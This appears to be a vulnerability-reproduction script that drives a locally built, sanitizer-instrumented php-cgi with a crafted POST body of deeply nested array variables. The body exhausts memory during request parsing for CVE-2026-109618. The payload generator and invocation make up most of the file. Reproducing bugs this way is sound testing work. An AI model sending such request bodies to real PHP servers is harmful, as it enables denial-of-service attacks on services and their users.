#!/bin/bash
# Drive an ASan-built php-cgi with the faithful CVE-2026-109618 trigger:
# a request body of deeply-nested variable names that exhausts memory during
# request parsing (before user code), mirroring Zend/tests/oom_request_parsing.phpt.
# Usage: asan_run.sh /path/to/php-cgi-<ver>-asan
CGI="$1"
WORK=$(mktemp -d)
echo '<?php echo "no OOM\n";' > "$WORK/target.php"

# a[][b][b]...(x63)=c  repeated 1000 times -> huge nested-array allocation at parse time
python3 - > "$WORK/body" <<'PY'
chunk = 'a[]' + '[b]'*63 + '=c'
import sys; sys.stdout.write('&'.join([chunk]*1000))
PY

echo "[*] body size: $(wc -c < "$WORK/body") bytes"
echo "[*] running $CGI with memory_limit=${MEMLIM:-2M} under ASan (USE_ZEND_ALLOC=0)"
echo "=========================================================="
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:exitcode=99 \
REQUEST_METHOD=POST \
CONTENT_TYPE=application/x-www-form-urlencoded \
CONTENT_LENGTH=$(wc -c < "$WORK/body") \
SCRIPT_FILENAME="$WORK/target.php" \
REDIRECT_STATUS=1 \
"$CGI" -n -d memory_limit=${MEMLIM:-2M} -d max_input_vars=100000 -d max_input_nesting_level=256 \
  < "$WORK/body" 2>&1 | head -40
echo "=========================================================="
echo "[*] exit: ${PIPESTATUS[0]}"
rm -rf "$WORK"
